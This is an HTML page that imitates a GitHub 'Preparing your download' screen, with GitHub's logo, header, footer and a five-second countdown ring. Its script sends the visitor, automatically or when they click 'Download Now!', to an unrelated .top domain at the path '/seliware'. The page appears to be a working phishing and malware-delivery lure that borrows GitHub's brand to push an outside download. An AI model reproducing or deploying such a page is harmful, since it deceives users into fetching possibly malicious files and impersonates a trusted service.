<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Preparing your download… · GitHub</title>
  <style>
    :root {
      --bg: #0d1117;
      --surface: #161b22;
      --border: #30363d;
      --text: #e6edf3;
      --muted: #7d8590;
      --green: #3fb950;
      --green-dim: #238636;
      --blue: #58a6ff;
    }

    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    html, body { height: 100%; }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
      background: var(--bg);
      color: var(--text);
      -webkit-font-smoothing: antialiased;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }

    a { color: var(--blue); text-decoration: none; }
    a:hover { text-decoration: underline; }

    /* ── HEADER ── */
    .header {
      background: rgba(22,27,34,.95);
      border-bottom: 1px solid var(--border);
      padding: 14px 28px;
      position: sticky;
      top: 0;
      z-index: 10;
      backdrop-filter: blur(12px);
    }
    .header-inner {
      max-width: 1200px;
      margin: 0 auto;
      display: flex;
      align-items: center;
      gap: 20px;
    }
    .logo {
      display: flex;
      align-items: center;
      gap: 9px;
      color: var(--text);
      font-size: 14px;
      font-weight: 600;
    }
    .logo svg { fill: currentColor; }
    .logo:hover { opacity: .75; }
    .search {
      flex: 1;
      max-width: 460px;
      position: relative;
    }
    .search input {
      width: 100%;
      height: 36px;
      padding: 0 12px 0 36px;
      background: #010409;
      border: 1px solid var(--border);
      border-radius: 6px;
      color: var(--text);
      font-size: 14px;
      outline: none;
      transition: .2s;
    }
    .search input:focus { border-color: var(--blue); box-shadow: 0 0 0 3px rgba(88,166,255,.2); }
    .search-ico {
      position: absolute;
      left: 11px;
      top: 50%;
      transform: translateY(-50%);
      fill: var(--muted);
      pointer-events: none;
    }
    .nav { display: flex; gap: 8px; margin-left: auto; }
    .nav button {
      height: 36px;
      padding: 0 14px;
      border-radius: 6px;
      font-size: 13px;
      font-weight: 500;
      cursor: pointer;
      transition: .18s;
    }
    .nav .ghost {
      background: transparent;
      border: 1px solid var(--border);
      color: var(--text);
    }
    .nav .ghost:hover { background: #1c2128; }
    .nav .primary {
      background: var(--green-dim);
      border: 1px solid rgba(240,246,252,.1);
      color: #fff;
    }
    .nav .primary:hover { background: var(--green); }

    @media (max-width: 640px) {
      .header { padding: 12px 16px; }
      .search, .nav { display: none; }
    }

    /* ── MAIN ── */
    .main {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 32px 16px;
    }

    .box {
      width: 100%;
      max-width: 400px;
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 14px;
      padding: 36px 28px 32px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 28px;
      box-shadow: 0 20px 60px rgba(0,0,0,.5);
      animation: up .35s ease-out;
    }

    @keyframes up {
      from { opacity: 0; transform: translateY(16px); }
      to   { opacity: 1; transform: translateY(0); }
    }

    /* ring */
    .ring-wrap { position: relative; width: 160px; height: 160px; }
    .ring-wrap svg {
      width: 160px;
      height: 160px;
      transform: rotate(-90deg);
    }
    .ring-bg  { fill: none; stroke: #21262d; stroke-width: 9; }
    .ring-arc {
      fill: none;
      stroke: url(#g);
      stroke-width: 9;
      stroke-linecap: round;
      stroke-dasharray: 440;
      stroke-dashoffset: 440;
      transition: stroke-dashoffset .12s linear;
      filter: drop-shadow(0 0 8px rgba(63,185,80,.45));
    }
    .ring-inner {
      position: absolute;
      inset: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 4px;
    }
    .ring-secs {
      font-size: 40px;
      font-weight: 700;
      line-height: 1;
      letter-spacing: -.04em;
      color: var(--green);
      font-variant-numeric: tabular-nums;
    }
    .ring-pct {
      font-size: 13px;
      color: var(--muted);
      font-variant-numeric: tabular-nums;
    }

    /* label */
    .label {
      text-align: center;
    }
    .label h1 {
      font-size: 18px;
      font-weight: 600;
      margin-bottom: 6px;
      letter-spacing: -.02em;
    }
    .label p {
      font-size: 13px;
      color: var(--muted);
      line-height: 1.6;
      max-width: 30ch;
      margin: 0 auto;
    }

    /* button */
    .dl-btn {
      width: 100%;
      height: 48px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      background: var(--green-dim);
      border: 1px solid rgba(240,246,252,.1);
      border-radius: 8px;
      color: #fff;
      font-size: 15px;
      font-weight: 700;
      cursor: pointer;
      transition: .2s;
      position: relative;
      overflow: hidden;
    }
    .dl-btn svg { fill: currentColor; }
    .dl-btn:hover {
      background: var(--green);
      box-shadow: 0 0 0 3px rgba(63,185,80,.2), 0 6px 20px rgba(35,134,54,.35);
      transform: translateY(-1px);
    }
    .dl-btn:active { transform: translateY(0); }

    /* info */
    .hint {
      font-size: 12px;
      color: var(--muted);
      text-align: center;
    }

    /* ── FOOTER ── */
    .footer {
      border-top: 1px solid var(--border);
      background: var(--surface);
      padding: 18px 16px;
    }
    .footer-inner {
      max-width: 1200px;
      margin: 0 auto;
      display: flex;
      align-items: center;
      justify-content: space-between;
      flex-wrap: wrap;
      gap: 12px;
    }
    .footer-left {
      display: flex;
      align-items: center;
      gap: 12px;
    }
    .footer-left svg { fill: #6e7681; }
    .footer-copy { font-size: 12px; color: var(--muted); }
    .footer-links { display: flex; flex-wrap: wrap; gap: 16px; }
    .footer-links a { font-size: 12px; color: #808080; }

    @media (max-width: 640px) {
      .footer-inner { flex-direction: column; align-items: center; text-align: center; }
    }

    @media (prefers-reduced-motion: reduce) {
      *, *::before, *::after {
        animation: none !important;
        transition: none !important;
      }
    }
  </style>
</head>
<body>
  <div id="root" data-redirect-url="https://4xxlnf.top/seliware" data-delay-ms="5000"
       style="display:flex;flex-direction:column;justify-content:space-between;height:100vh;">

    <header class="header">
      <div class="header-inner">
        <a class="logo" href="#" aria-label="GitHub">
          <svg width="32" height="32" viewBox="0 0 16 16" aria-hidden="true">
            <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
          </svg>
          <span>GitHub</span>
        </a>

        <div class="search">
          <svg class="search-ico" width="16" height="16" viewBox="0 0 16 16" aria-hidden="true">
            <path fill-rule="evenodd" d="M11.5 7a4.5 4.5 0 11-9 0 4.5 4.5 0 019 0zm-.82 4.74a6 6 0 111.06-1.06l3.04 3.04a.75.75 0 11-1.06 1.06l-3.04-3.04z"/>
          </svg>
          <input type="text" placeholder="Search or jump to…" aria-label="Search" />
        </div>

        <nav class="nav" aria-label="User actions">
          <button class="ghost" type="button">Sign in</button>
          <button class="primary" type="button">Sign up</button>
        </nav>
      </div>
    </header>

    <main class="main">
      <div class="box">

        <div class="ring-wrap" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0" id="ringWrap">
          <svg viewBox="0 0 160 160" aria-hidden="true">
            <defs>
              <linearGradient id="g" x1="0%" y1="0%" x2="100%" y2="100%">
                <stop offset="0%" stop-color="#238636"/>
                <stop offset="100%" stop-color="#3fb950"/>
              </linearGradient>
            </defs>
            <circle class="ring-bg" cx="80" cy="80" r="70"/>
            <circle class="ring-arc" id="arc" cx="80" cy="80" r="70"/>
          </svg>
          <div class="ring-inner">
            <span class="ring-secs" id="secs">5s</span>
            <span class="ring-pct" id="pct">0%</span>
          </div>
        </div>

        <div class="label">
          <h1>Preparing your download...</h1>
          <p>Your file will be ready in a moment. The redirect starts automatically.</p>
        </div>

        <button class="dl-btn" id="dlBtn" type="button">
          <svg width="16" height="16" viewBox="0 0 16 16" aria-hidden="true">
            <path d="M2.75 14A1.75 1.75 0 011 12.25v-2.5a.75.75 0 011.5 0v2.5c0 .138.112.25.25.25h10.5a.25.25 0 00.25-.25v-2.5a.75.75 0 011.5 0v2.5A1.75 1.75 0 0113.25 14H2.75z"/>
            <path d="M7.25 7.689V2a.75.75 0 011.5 0v5.689l1.97-1.969a.75.75 0 111.06 1.06l-3.25 3.25a.75.75 0 01-1.06 0L4.22 6.78a.75.75 0 111.06-1.06l1.97 1.969z"/>
          </svg>
          Download Now!
        </button>

        <p class="hint">Keep this tab open · Download starts automatically</p>

      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        <div class="footer-left">
          <a href="#" aria-label="GitHub">
            <svg height="22" viewBox="0 0 16 16" width="22" aria-hidden="true">
              <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"/>
            </svg>
          </a>
          <span class="footer-copy">© 2026 GitHub, Inc.</span>
        </div>
        <nav class="footer-links" aria-label="Footer">
          <a href="#">Terms</a>
          <a href="#">Privacy</a>
          <a href="#">Security</a>
          <a href="#">Status</a>
          <a href="#">Docs</a>
          <a href="#">Contact GitHub</a>
          <a href="#">Pricing</a>
          <a href="#">API</a>
          <a href="#">Blog</a>
        </nav>
      </div>
    </footer>

  </div>

  <script>
    (() => {
      const root     = document.getElementById('root');
      const url      = root.dataset.redirectUrl || '';
      const delay    = Math.max(0, Number(root.dataset.delayMs || 5000));

      const arcEl    = document.getElementById('arc');
      const secsEl   = document.getElementById('secs');
      const pctEl    = document.getElementById('pct');
      const wrap     = document.getElementById('ringWrap');
      const btn      = document.getElementById('dlBtn');

      const C = 2 * Math.PI * 70; // ≈ 439.8
      arcEl.style.strokeDasharray  = C;
      arcEl.style.strokeDashoffset = C;

      let t0 = performance.now(), raf = null, done = false;

      function tick(now) {
        if (done) return;
        const elapsed  = now - t0;
        const ratio    = delay === 0 ? 1 : Math.min(elapsed / delay, 1);
        const secs     = Math.ceil(Math.max(0, delay - elapsed) / 1000);
        const pct      = Math.round(ratio * 100);

        arcEl.style.strokeDashoffset = C * (1 - ratio);
        secsEl.textContent = secs + 's';
        pctEl.textContent  = pct + '%';
        wrap.setAttribute('aria-valuenow', pct);

        if (elapsed >= delay) { go(); return; }
        raf = requestAnimationFrame(tick);
      }

      function go() {
        if (done) return;
        done = true;
        if (raf) cancelAnimationFrame(raf);
        if (url) window.location.assign(url);
      }

      btn.addEventListener('click', go);

      document.addEventListener('visibilitychange', () => {
        if (document.hidden) { if (raf) cancelAnimationFrame(raf); }
        else if (!done) raf = requestAnimationFrame(tick);
      });

      raf = requestAnimationFrame(tick);
    })();
  </script>
</body>
</html>
